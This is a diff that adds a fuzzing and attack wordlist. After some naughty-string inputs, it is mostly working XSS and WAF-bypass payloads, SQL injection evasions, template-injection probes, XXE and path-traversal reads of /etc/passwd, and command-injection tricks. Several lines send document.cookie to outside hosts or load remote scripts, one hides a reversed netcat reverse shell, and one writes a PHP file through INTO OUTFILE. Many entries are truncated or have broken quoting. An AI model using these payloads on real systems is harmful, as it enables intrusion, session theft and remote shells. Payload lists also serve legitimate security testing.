@@ -1,0 +1,742 @@
+AttackOvLongpig
+
+{“id”:[111]}
+{“id”:{“id”:111}}
+""user_id"":""*""
+{""user_id"":""*""}
+test@test.com
+true
+false
+TRUE
+FALSE
+True
+False
+1
+-1
+0
+{"admin": true}
+"__proto__": {"admin": true}
+{"__proto__": {"admin": true}}
+SET
+REMOVE 
+DEBUG
+TRACK
+FORWARD
+MOVE
+INFO
+<h2Hello</h2>
+%
+$
+^
+&&
+||
+!
+@
+#
+*
+{}
+[]
+%00
+%AD
+%0a%0d
+[true]
+{"$eq": "dana"}
+null
+undefined
+undef
+null
+NULL
+(null)
+nil
+NIL
+true
+false
+True
+False
+TRUE
+FALSE
+None
+hasOwnProperty
+then
+\
+\\
+0
+1
+1.00
+$1.00
+1/2
+1E2
+1E02
+1E+02
+-1
+-1.00
+-$1.00
+-1/2
+-1E2
+-1E02
+-1E+02
+1/0
+0/0
+-2147483648/-1
+-9223372036854775808/-1
+-0
+-0.0
++0
++0.0
+0.00
+0..0
+.
+0.0.0
+0,00
+0,,0
+,
+0,0,0
+0.0/0
+1.0/0.0
+0.0/0.0
+1,0/0,0
+0,0/0,0
+--1
+-
+-.
+-,
+999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
+NaN
+Infinity
+-Infinity
+INF
+1#INF
+-1#IND
+1#QNAN
+1#SNAN
+1#IND
+0x0
+0xffffffff
+0xffffffffffffffff
+0xabad1dea
+123456789012345678901234567890123456789
+1,000.00
+1 000.00
+1'000.00
+1,000,000.00
+1 000 000.00
+1'000'000.00
+1.000,00
+1 000,00
+1'000,00
+1.000.000,00
+1 000 000,00
+1'000'000,00
+01000
+08
+09
+2.2250738585072011e-308
+,./;'[]\-=
+<>?:"{}|_+
+!@#$%^&*()`~
+
+
+	              ​    　
+­؀؁؂؃؄؅؜۝܏᠎​‌‍‎‏‪‫‬‭‮⁠⁡⁢⁣⁤⁦⁧⁨⁩⁪⁫⁬⁭⁮⁯﻿￹￺￻𑂽𛲠𛲡𛲢𛲣𝅳𝅴𝅵𝅶𝅷𝅸𝅹𝅺󠀁󠀠󠀡󠀢󠀣󠀤󠀥󠀦󠀧󠀨󠀩󠀪󠀫󠀬󠀭󠀮󠀯󠀰󠀱󠀲󠀳󠀴󠀵󠀶󠀷󠀸󠀹󠀺󠀻󠀼󠀽󠀾󠀿󠁀󠁁󠁂󠁃󠁄󠁅󠁆󠁇󠁈󠁉󠁊󠁋󠁌󠁍󠁎󠁏󠁐󠁑󠁒󠁓󠁔󠁕󠁖󠁗󠁘󠁙󠁚󠁛󠁜󠁝󠁞󠁟󠁠󠁡󠁢󠁣󠁤󠁥󠁦󠁧󠁨󠁩󠁪󠁫󠁬󠁭󠁮󠁯󠁰󠁱󠁲󠁳󠁴󠁵󠁶󠁷󠁸󠁹󠁺󠁻󠁼󠁽󠁾󠁿
+﻿
+￾<IMG SRC=" &#14;  javascript:alert('XSS');">
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
+<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
+<SCRIPT SRC=//ha.ckers.org/.j>
+<IMG SRC="javascript:alert('XSS')"
+<iframe src=http://ha.ckers.org/scriptlet.html <
+\";alert('XSS');//
+<u oncopy=alert()> Copy me</u>
+<i onwheel=alert(1)> Scroll over me </i>
+<plaintext>
+http://a/%%30%30
+</textarea><script>alert(123)</script>
+1;DROP TABLE users
+1'; DROP TABLE users-- 1
+' OR 1=1 -- 1
+' OR '1'='1
+ 
+%
+_
+-
+--
+--version
+--help
+$USER
+/dev/null; touch /tmp/blns.fail ; echo
+`touch /tmp/blns.fail`
+$(touch /tmp/blns.fail)
+@{[system "touch /tmp/blns.fail"]}
+eval("puts 'hello world'")
+System("ls -al /")
+`ls -al /`
+Kernel.exec("ls -al /")
+Kernel.exit(1)
+%x('ls -al /')
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
+$HOME
+$ENV{'HOME'}
+%d
+%s%s%s%s%s
+{0}
+%*.*s
+%@
+%n
+File:///
+../../../../../../../../../../../etc/passwd%00
+../../../../../../../../../../../etc/hosts
+() { 0; }; touch /tmp/blns.shellshock1.fail;
+() { _; } >_[$($())] { touch /tmp/blns.shellshock2.fail; }
+<<< %s(un='%s') = %u
++++ATH0
+CON
+PRN
+AUX
+CLOCK$
+NUL
+A:
+ZZ:
+COM1
+LPT1
+LPT2
+LPT3
+COM2
+COM3
+COM4
+DCC SEND STARTKEYLOGGER 0 0 0
+";alert(0);//
+java%0d%0ascript%0d%0a:alert(0)
+//google.com
+https:google.com
+//google%E3%80%82com
+\/\/google.com/
+/\/google.com/
+//google%00.com
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
+' UNION SELECT null,null-- -
+ls||id; ls ||id; ls|| id; ls || id 
+ls|id; ls |id; ls| id; ls | id 
+ls&&id; ls &&id; ls&& id; ls && id 
+ls&id; ls &id; ls& id; ls & id 
+ls %0A id 
+& %26
+&& %26%26
+| 
+||
+%0A
+;
+\n  
+0x0a 
+`
+command ` 
+$(
+/???/??t /???/p??s??
+${{<%[%'"}}%\. 
+{php}print "Hello"{/php}
+{php}$s = file_get_contents('/etc/passwd/, NULL, NULL, 0, 100); var_dump($s);{/php}
+{{this.constructor.constructor}}
+{{this.constructor.constructor('process.pid')())}}
+${7*7}
+{{7*7}}
+a{*comment*}b
+{{ [].__class__.__base__.__subclasses__() }}
+{{ ''.__class__.__mro__ }}
+{{ ''.__class__.__mro__[1] }}
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+{{7*'7'}}
+${"z".join("ab")}
+${{<%[%'"}}%\.
+javascript:%ef%bb%bfalert(XSS)
+%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F
+%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd
+../../etc/passwd
+"<svG/x="">""/oNloaD=confirm()//"
+http://⑯⑨。②⑤④。⑯⑨｡②⑤④/
+http://⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80/
+http://⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80/
+http://②⑧⑤②⓪③⑨①⑥⑥:80/
+http://④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80/
+http://⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥
+alert?.(document?.cookie)
+<x/ onpointerRawupdatE=+\u0061\u006cert&DiacriticalGrave;1&DiacriticalGrave;>Tocuch me!
+"<input accesskey=X onclick=""self['wind'+'ow']['one'+'rror']=alert;throw 1337;"">"
+<lol/onauxclick=[0].some(alert)>rightclickhere
+"\""<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss"
+marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>
+"<svg onload='new Function`[""_Y000!_""].find(al\u0065rt)`'>"
+"<svg onload=""[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162'] ('\141\154\145\162\164\50\61\51')()"">"
+<svg onload=&#97&#108&#101&#114&#116(1)>
+"<svg onload='new Function`[""_Y000!_""].find(al\u0065rt)`'>"
+$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
+<svg%09%0a%0b%0c%0d%a0%00%20onload=alert (1)>
+"Function(""\x61\x6c\x65\x72\x74\x28\x31\x29"")();"
+"<svg onload=alert("""")>"
+"<svg onload=alert%26%230000000040"""")>"
+<svg onx=() onload=(confirm)(1)>
+<object/data=javascript:alert()>
+"<a/href=""javascript%0A%0D:alert()"">"
+"-(a=alert
+-alert(1)-'
+<marquee loop=1 onfinish=alert( )>x
+Javascript://%E2%80%A9alert(618)
+"~2; ""%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E"""
+for(t?c.outerHTmL=o:i=o=’’;i++<1024;o+=`<code onclick=this.innerHTmL=’${M(i)?’*’:n||’·’}’>#</code>${i%64?’’:’<p>’}`)for(n=j=0;j<9;n+=M(i-65+j%3+(j++/3|0)*64))M=i=>i>64&i<960&i%64>1&C(i*i)>.7
+"<sVg OnPointerEnter=""location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div"">"
+%00' UNION SELECT password FROM Users WHERE username-'tom'--
+/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/usersame/**/LIKE/**/'tom'--
+$ <ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=? ------
+"<img src=1 onerror=""a:b:c:d:alert(1)"">"
+<iframe src=javascript:src=http://top.name></iframe>
+<svg onx=() onload=(confirm)(1)>
+cat /etc/pa?swd
+cat /etc/pa’ss’wd
+cat /etc/pa**wd
+ec’h’o ‘cat /etc/examplewd’ | sed ‘s/example/pass/g’ | bash
+"[“1807192982')) union select 1
+"[“1807192982')) union se”
+"[“1807192982')) union/**/select/**/1
+"<iframe src=data:text/html
+<a href=javas%26#99;ript:prompt%26#x28document.domain)>xss
+<script/%00%00v%00%00>document.location.href=location.hash.slice(1)</script>#javascript:alert(document.cookie)
+<script> http://window.name=`<img src=x onerror=alert(top.document.domain)>` location=`https://domain/?xss=<iframe src=javascript:src=http://top.name>x</iframe>` </script>
+"""><video><source onerror=eval(atob(http://this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXlkaW5ueXVudXMueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61;>"
+"<svg><script xlink:href=""{ASCII}data:
+"<svg/OnLoad=""`${prompt``}`"">"
+<xssBypass/onpointermove=(confirm)(1)>MoveMouseHere
+{{constructor.constructor('alert(1)')()}}
+{{constructor.constructor(alert`1`)()}}
+"onerror=""x='ale';z='r';y='t';p='`XSS`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`"
+Hh'><script>alert(1)</script> = waf
+Hh'><marquee loop=1 width=0 onfinish=pr\u006fmpt`_Y000!_`>Y000</marquee> = waf bypassed
+"onerror=""x='ale';z='r';y='t';p='`XSS`';new constructor.constructor`zzz${`${x}${z}${y}${p}`}bbb`"
+"<?xml version=""1.0"" encoding=""UTF-7""?> +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY"
+"""on{{click=prompt(document['cookie'])/*}}*/>"
+"Tarun~<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;"">XXXXX</a>"
+"%55%4eiON SeLeCt 1
+%22%3e%3c%5K/onwheel=alert(1)%3emouse%20wheel%20here%3c%21--
+"<video src=x onerror=""prompt(xss"">"
+"<video src=x onerror=""prompt(xss)"">"
+"<video src=x onerror1=""prompt(xss)"">"
+"<sVg OnPointerEnter=""location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//</div"">"
+<iframe src=java&Tab;sc&Tab;ript:al&Tab;ert()></iframe>
+"<iframe src=""java sc ript:al ert()""></iframe>"
+"{{{}[{toString:[].join
+"<svg/OnLoad=""`${prompt``}`"">"
+%3Cx/Onpointerrawupdate=confirm%26lpar;)%3Exxxxx
+%60%2balert/**/(1)%2b%60
+"<details/open/ontoggle=""self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"">"
+"union (/*!/**/ SeleCT */ 1
+"tarun""><x/onafterscriptexecute=confirm%26lpar;)//"
+{{constructor.constructor('eval(atob(\'amF2YXNjcmlwdDphbGVydChkb2N1bWVudC5jb29raWUp\'))')()}}
+"≋ ""><!'/*""*\'/*\""/*--></Script><Image SrcSet=K */; OnError=confirm(document.domain) //># ≋"
+%2f%2a%2a%2f%75%6e%69%6f%6e%2f%2a%2a%2f%73%65%6c%65%63%74
+"(select%20group_concat(table_name
+"%55nion(%53elect+1
+/*!%55NiOn*/%20/*!%53eLEct*/+
+"-1945+/*!%55NiOn*/%20/*!%53eLEct*/+1
+""">'><details/open/ontoggle=confirm('XSS')>"
+"<input type=""hidden"" value=""mypayload"" /> %22%20autofocus%20onfocus%3d(confirm)(1)%2f%2f"
+%22%20autofocus%20onfocus%00%3d(confirm)(1)%2f%2f
+/*!50000%55nIoN*/+/*!50000%53eLeCt*/+
+"a' UNION SELECT 1
+javascript:new%20Function`al\ert\`1\``;
+""">'><details/open/ontoggle=confirm('XSS')>"
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;
+;+$u+cat+/etc$u/passwd$u
+;+$u+cat+/etc$u/passwd+\#
+/???/??t+/???/??ss??
+/?in/cat+/et?/passw?
+window['alert']()
+this['alert']()
+(alert)()
+eval(atob('YWxlcnQoKQ=='))
+document['cookie']
+<svg onx=() onload=(confirm)(1)>
+/**8**/and/**8**/0/**8**//*!50000union*//**8**//*!50000select*//**8**/+ numero de columnas +--+
+<img src onerror=confirm(1)>
+&gt;+src+onerror=confirm&lpar;1&rpar;&lt;
+&gt;+src+onerror=confirm&amp;lpar;1&amp;rpar;&lt;
+/etc/passwd
+/e?c/?asswd
+/e*c/*asswd
+/??c/?asswd
+/??c/?assw?
+"""></textarea><ScRiPt>prompt(1)</ScRiPt// ""><iframe/onload=alert(1)// ”/>&_lt;_script>alert(1)&_lt;/scr_ipt&gt”/>"
+"«input»; p=-alert(1)}//\ $result* var n = {a: ""-alert(1)}//\""
+"«input»; p=\&q=-alert(1)// $result* var n = {a: ""\""
+"<x onauxclick=a=alert
+'x'%2520onclick='confirm%601%60'
+%0A%0d+select+user+from+dual+%0A%0D
+image src\r\n=valid.jpg onloadend='new class extends (co\u006efir\u006d)/**/`` &lcub;&rcub;'>
+""">'><details/open/ontoggle=confirm('XSS')>"
+"?url=""onm<>ouseover=""ale<>rt(1)"
+document.write(atob('PGltZyBzcmM9aHR0cDovL2xvY2FsaG9zdDo4MDkvcD89') + btoa(document.cookie) + '>')
+window[document.body.innerText.charAt(document.body.innerText.indexOf('a'))+'lert'](1)
+"<img src=something onauxclick=""new Function `al\ert\`xss\``"">"
+"?url=""onm<>ouseover=""ale<>rt(1)"
+"""un<>ion sel<>ect"""
+/*!50000%55nIoN*/+/*!50000%53eLeCt*/+
+`payload´; %3Cimg src='null' onerror=alert('spyerror')%3E
+<details onauxclick=confirm`xss`></details>
+file:///etc/./passwd
+"<style>@keyframes a{}b{animation:a;}</style> <b/onanimationstart=prompt`${document.domain}&#x60;>"
+`curl -L http://ⒼⓄⓄⒼⓁⒺ.ⒸⓄⓂ`
+"<audio autoplay onloadstart=this.src='hxxps://msf.fun/?c='+document[""cook""+""ie""]' src=x>"
+<bleh/onclick=top[/al/.source+/ert/.source]&Tab;``>click
+/<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+/<svg%0Aonauxclick=0;[1].some(confirm)//
+;+$u+cat+/etc$u/passwd$u
+;+$u+cat+/etc$u/passwd+\#
+/???/??t+/???/??ss??
+/?in/cat+/et?/passw?
+SELECT-1e1FROM`test`
+SELECT~1.FROM`test`
+SELECT\NFROM`test`
+SELECT@^1.FROM`test`
+SELECT-id-1.FROM`test`
+"<details/open/ontoggle=""self['wind'%2b'ow']['one'%2b'rror']=self['wind'%2b'ow']['ale'%2b'rt'];throw/**/self['doc'%2b'ument']['domain'];"">"
+"{` <body \< onscroll =1(_=prompt
+<svg%0Aonauxclick=0;[1].some(confirm)//
+"(xss""><!--><svg/onload=alert(document.domain)>)"
+<base href=//knoxss.me>
+"<!ENTITY % data SYSTEM ""netdoc:/etc/passwd"">"
+sle%25p%28'0x12'%2b1) => sleep('ox12' + 1)
+<form><button formaction=javascript:top['ev'+'al'](self['\x61\x74\x6f\x62'](`YWxlcnQoMSk7`));//
+"""<> au<>tof<>ocus o<>nfo<>cus=<>al<>ert<>(1<>)"
+""" onauxclick=confirm`xss` """
+<svg onauxclick='a=alert;b=document;a(b.domain)'>
+%22onauxclick=alert`xss`+a
+"</pre><!-%00-><svg/%0D%0A%0D%0A/Id=""a""/TABindex=""1""/onload=""\u0061lert(1);"">"
+"<script src=""https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1…)""></script>"
+""">'><details/open/ontoggle=confirm('XSS')>"
+%27;%0d%0d});%0d{onerror=prompt}throw document.location</ScRipT//
+"<object/data=""javascript&colon;alert/**/(document.domain)"">//"
+"<iframe/onload='this[""src""]=""javas&Tab;cript:al""+""ert``""';>"
+<img/src=q onerror='new Function`al\ert\`1\``'>
+"open(""https://host/?xss=%3Ca/href=javascript:1%26%26%26%23x6e;ame%3Eclick me%3C/a%3E""
+"';!--""<XSS>=&{()}"
+"<IMG SRC=""javascript:alert('XSS');"">"
+"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">"
+"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">"
+"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">"
+"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">"
+<img src=x:alert(alt) onerror=eval(src) alt='spyerror'>
+"""></tag><svg onload=alert(spyerror)>"
+"<iframe/src=data:text/html;base64
+<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+"["" <style>@KeyFrames z{</style><div style=animation-name:z onanimationend=&#97&#108&#101&#114&#116&grave;1&grave;> %253Cscript%253Ealert('XSS')%253C%252Fscript%253E ""</script> ""]"
+<!<script>alert(1)</script> “
+"<details open ontoggle='self[""ale""%2b""rt""]&lpar;document&period;domain&rpar;'>"
+<svg/onload=%26nbsp;alert`bohdan`+
+<img src onerror=%26emsp;prompt`${document.domain}`>
+%3Cscript%3Ealert(document.cookie)%3C/script%20ByPass%3E
+"<iframe/onload='this[""src""]=""jav""+""as&Tab;cr""+""ipt:al""+""er""+""t()""';>"
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+;+$u+cat+/etc$u/passwd$u
+;+$u+cat+/etc$u/passwd+\#
+"<div style=""background:url(/f#&#127;oo/;color:red/*/foo.jpg);"">X"
+"</Scrpt/""%27--!>%20<Scrpt>%20confirm(1)%20</Scrpt>"
+"</> "" <a+HREF='%26%237javascrip%26%239t:alert%26lpar;document.domain)'> "" </>"
+/* <audio src=1 onloadstart=alert&lpar;1&rpar;//> */
+<img%20id=%26%23x101;%20src=x%20onerror=%26%23x101;;alert`1`;>
+<style>img{background-image:url('javascript:alert(1)')}</style>
+<style>*{background-image:url('\6A\61\76\61\73\63\72\69\70\74\3A\61\6C\65\72\74\28\6C\6F\63\61\74\69\6F\6E\29')}</style>
+"""><iframe srcdoc='%26lt;script>;prompt${document.domain}%26lt;/script>'>"
+"xss'""><iframe srcdoc='%26lt;script>;alert(1)%26lt;/script>'>"
+<--`<img%2fsrc%3d` onerror%3dalert(document.domain)> --!>
+"""<BODY onload!#$%&()*~+-_.###:;?@[/|\]^`=alert(“XSS”)>"""
+"""><input/onauxclick=""[1].map(prompt)"">"
+"<details open ontoggle=""{alert`1`}""></details>"
+"<j id=x style=""-webkit-user-modify:read-write"" onfocus={window.onerror=eval}throw/0/+name>H</j>#x"
+%20foo_bar%00=foo%20bar%00=foo%5bbarfoo[bar
+"data:text/html
+"<j id=x style=""-webkit-user-modify:read-write"" onfocus={window.onerror=eval}throw/0/+name>H</j>#x"
+"1'""><img/src/onerror=.1|alert``>"
+<!<script>alert(document.domain)</script>
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+<!<script>confirm(1)</script>
+<bleh/ondragstart=&Tab;parent&Tab;['open']&Tab;&lpar;&rpar;%20draggable=True>dragme
+eval('al'+'ert'+'(12)');//
+$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev)
+<iframe src=java&Tab;sc&Tab;ript:al&Tab;ert()></iframe>
+"<iframe src=""java sc ript:al ert()""></iframe>"
+"xss'""><iframe srcdoc='%26lt;script>;prompt`${document.domain}`%26lt;/script>'>"
+<svg onload=prompt%26%230000000040document.domain)>
+<svg onload=prompt%26%23x000000028;document.domain)>
+"- xss""></a><input value=""Type anything""onbeforeinput=""prompt%26lpar%3Bdocument.domain%26rpar%3B""><!--"
+"/???/??t /???/??ss??'."" --"
+><tag onxxxx=alert(1)>
+"><tag onxxxx=""'a'|alert(1)"">"
+"<iframe name=""<svg/onload=alert(23)>"" src=""http://example[.]com/x.php?age=23;%0adocument.body.innerHTML=name//"">"
+http://example[.]com/x.php?age=23;%0adocument.body.innerHTML=location.hash;//#<svg/onload=alert(23)>
+"<svg onload\r\n=$.globalEval(""al""+""ert()"");>"
+<input/oninput='new Function`confir\u006d\`0\``'>
+"<p/ondragstart=%27confirm(0)%27.replace(/.+/
+<lol/onauxclick=[0].some(alert)>rightclickhere
+<iframe/src='%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A:prompt`1`'>
+"param=XSS""%0D<body='X' onmouseover=setInterval`alert\x28&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#111;&#111;&#107;&#105;&#101;\x29`//"
+cd..\..\..\..\ && dir
+cd..&&cd..&&cd..&&cd..&&dir
+%22%3E%3Cd3v%2Fonauxclick%3D%5B2%5D.some%28confirm%29%3Eclick
+%3balert`1`%3b
+../../../../../../e*c/p*s*d{{' http://server/...
+system(“cat /etc/passwd”);
+<--`<img/src=`%20onerror=confirm``>%20--!>
+".1union/**_**/select/*!.1*/
+"uNioN sElEcT 1
+"""/*'/*`/*--><html \"" onmouseover=/*&lt;svg/*/onload=alert()//>"
+//comment%0a%0dalert(0);
+%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)
+"""/*'/*`/*--><html \"" onmouseover=/*&lt;svg/*/onload=alert()//>"
+<!<script>alert(4)</script>
+"<a href=""j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;"">X</a>"
+<marquee loop=1 width=0 onfinish=alert`1`>XSS</marquee>
+"if/*!90000*/((3*9)>(0)
+"Tarun~<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by-tarun/&rpar;"">XXXXX</a>"
+"onload=\""a='alert()';d='XSS ';b='t(d)';c=a+b;console.log(eval(c));"
+"a<%00meta name=""i"" HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/h%00tml;base64
+""">a<marquee onstart='constructor.constructor(atob(""ywxlcnqoj09qru5cvudct1vovfknkq""))()'></marquee>"
+"%22%3E%3Cobject%20data=data:text/html;;;;;base64
+"""><block%quote oncontextmenu%3Dconfirm(1)>Right click me</blockquote><!--"
+"?""></script><base%20c%3D=href%3Dhttps:\targetsite>"
+<a href=javas&#99;ript:alert(1)>
+"<object data='data:text/html;;;;;base64
+"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=data:text/html;base64
+"<style><img src=""</style><img src=x ""><object data=""data:text/html;base64
+"\u0065\u0076\u0061\u006C('ablolzers'['replace'](""b""
+"s = '""><script>alert(1)</script>' print 'eval(String.fromCharCode('+""
+"<svg><script xlink:href=data:
+<form action=javascript:alert(1)><input type=submit>
+"jaVasCript:/*-/*`/*\`/*'/*""/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e"
+eeee<%2fscript><script>prompt(/XSS/.source)<%2fscript>yyyy
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+<svg/onload=self[`aler`%2b`t`]`1`>
+ INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>
+"<iframe/onload='this[""src""]=""javas&Tab;cript:al""+""ert``""';>"
+<img/src=q onerror='new Function`al\ert\`1\``'>
+/*!50000union select*/
+/*!12345union select*/
+/*!13337union select*/
+"sg7cx""%20onerror%3d""confirm(document.domain)""gd67e"
+src=x:alert(alt) alt=3117
+<scronerror=ipt>prompt(document.domain)</scronerror=ipt>
+"window[""ev"".concat(""al"")](String.fromCharCode(97
+~${ OGNL Payload }
+"<brute+onbeforescriptexecute=a=alert
+%23?zen?%0Aunion all%23zen%0A%23Zen%0Aselect
+/foo/../etc/bar/../passwd
+"<svg><script xlink:href=""{ASCII}data:
+<marquee/onstart=c=String.fromCharCode;confirm(c(47)+c(88)+c(83)+c(83)+c(47))>
+"""><input type=""submit"" formaction=""javascript&colon;this&lsqb;'a'&plus;'lert'&rsqb;`1`"""
+"<p style=""height:100px"" onwheel=""self['al'+'ert'](self['ev'+'al']('docu'+'ment.coo'+'kie'))""></p>"
+*!50000group_coNcat(*/) /*!50000coNcat(*/) `coNcat`%0a%0b%0c%0d%a0() concat/**x**/()
+param?id=@:=(%23 a %0a select 123 from ((table)))/1e0union%23 a %0a
+<video autoplay onplay=alert`1` src=//w3schools.com/tags/movie.mp4>
+"<input type=search onsearch=""location='data:text/html;\x62\x61\x73\x65\x36\x34
+<input onf%0Aocus=alert(1) autofocus/
+%0a ls -la
+"<!DOCTYPE :_-_: SYSTEM ""ftp://x.s.artsploit.com/"">"
+<img onerror=$.getScript(String.fromCharCode(*CODE*)); src='asd'> where *CODE* = scripturl
+"<meta/content=""0;url=data:text/html;base64
+"0\""autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>""-confirm(3)-"""
+<marquee loop=1 width=0 onfinish=prompt(1)>1</marquee>
+/**/ORDER/**/BY/**/
+/*!order*/+/*!by*/
+/*!ORDER BY*/
+/*!50000ORDER BY*/
+"?url=""onm<>ouseover=""ale<>rt(0)"
+"<img/src=""x""/onerror=""prom\u0070t&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;"">"
+"""><h2 id=""Iamheading""onmouseover=""confirm(1)"">"
+<a x href=javascript%26%23x3A%3Bconfirm(1)>a</a>
+%253C%252Fscript%253E%253Cscript%253Ealert%2528%2527XSS%2520here%2521%2527%2529%253C%252Fscript%253E
+/???/???/c?t$IFS/???/p?s?w?
+<sCRipT>alert(1)</sCRiPt>
+<script>%0d%0aalert(1)</script>
+<scr<script>ipt>alert(1);</scr</script>ipt>
+"<a/href=""j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;"">"
+<svg•onload=alert(1)>
+?><img src=x onmouseleave=print()>
+"?><a/\test=?%26quot;x%26quot;?href=?%01javascript:/*%b1*/;location.assign(?//hackerone.com/stealthy?x=?+location)?>Click"
+"<style>@keyframes a{}b{animation:a;}</style><b/onanimationstart=prompt`${document.domain}&#x60;>"
+<marquee+loop=1+width=0+onfinish='new+Function`al\ert\`1\``'>
+<svg><circle><set onbegin=prompt(1) attributename=fill>
+"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt
+%3balert`1`%3b
+"asd""`> onpointerenter=x=prompt
+<x onauxclick=import('//1152848220/')>click
+"<x onauxclick=a=alert
+<x onauxclick=import('//1152848220/')>click
+<x onauxclick=import('//xss/')>click
+"\""<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss"
+{{constructor.constructor(alert`1`)()}}
+"javascript:new%20Function`al\ert\`1\``;"
+"<script>Object.prototype.BOOMR = 1;"
+Object.prototype.url='https://portswigger-labs.net/xss/xss.js'</script> -https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+">%0D%0A%0D%0A<x '=foo""><x foo='><img src=x onerror=javascript:alert(`cloudfrontbypass`)//'>"
+>'><details/open/ontoggle=confirm('XSS')>
+6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/
+"&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;"
+file:/etc/passwd?/
+file:/etc/passwd%3F/
+file:/etc%252Fpasswd/
+file:/etc%252Fpasswd%3F/
+file:///etc/?/../passwd
+file:///etc/%3F/../passwd
+file:${br}/et${u}c/pas${te}swd?/
+file:$(br)/et$(u)c/pas$(te)swd?/
+`\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29?`
+"?XOR(if(now()=sysdate()
+"= onfocus=$.ajax({url:?http://&#8217;.concat(?yourxsshunder .xss.ht?)
+<input id=?a?value=?global?><input id=?b?value=?E?><input ?id=?c?value=?val?><input id=?d?value=?aler?><input id=?e?value=?t(documen?><input id=?f?value=?t.domain)?><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>
+?><img src=1 onmouseleave=print()>
+uniUNIONon
+<a?/onclick=(confirm)(document.cookie)>Click Here!
+<svg onload=prompt%26%230000000040document.domain)>
+"<svg onload=prompt%26%23?000000028;document.domain)>"
+"<x/onclick=globalThis&lsqb;?\u0070r\u006f?+?mpt?]&lt;)>clickme"
+"test?
+? <a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus> ?
+<svg onload=prompt%26%230000000040document.domain)>
+"<svg onload=prompt%26%23?000000028;document.domain)>"
+../et*/pas**d
